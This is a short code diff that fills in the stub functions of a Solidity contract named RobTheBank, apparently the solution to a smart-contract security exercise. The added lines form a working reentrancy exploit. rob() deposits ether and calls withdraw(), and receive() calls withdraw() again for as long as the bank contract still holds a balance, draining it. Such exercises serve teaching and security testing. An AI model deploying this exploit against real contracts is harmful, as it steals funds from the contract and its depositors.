@@ -27,9 +27,14 @@ contract RobTheBank {
     
     function rob() public payable {
         // your code here
+        bank.deposit{value: msg.value}();
+        bank.withdraw();
     }
 
     receive() external payable {
         // your code here
+        if (address(bank).balance > 0) {
+            bank.withdraw();
+        }
     }
 }
